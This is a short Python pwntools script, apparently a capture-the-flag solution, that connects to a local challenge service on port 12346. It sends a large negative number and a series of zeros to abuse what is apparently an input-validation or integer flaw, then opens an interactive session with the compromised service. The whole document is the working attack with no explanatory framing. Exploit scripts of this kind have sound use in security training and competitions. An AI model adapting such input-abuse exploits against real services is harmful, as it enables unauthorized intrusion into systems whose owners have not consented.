#!/usr/bin/env python3
from pwn import *

r = remote('127.0.0.1', 12346)
r.sendlineafter(": ", "-13371337")
r.sendlineafter(": ", "1")

for _ in range(4):
    r.sendlineafter(": ", "0")
    r.sendlineafter(": ", "0")

r.interactive()
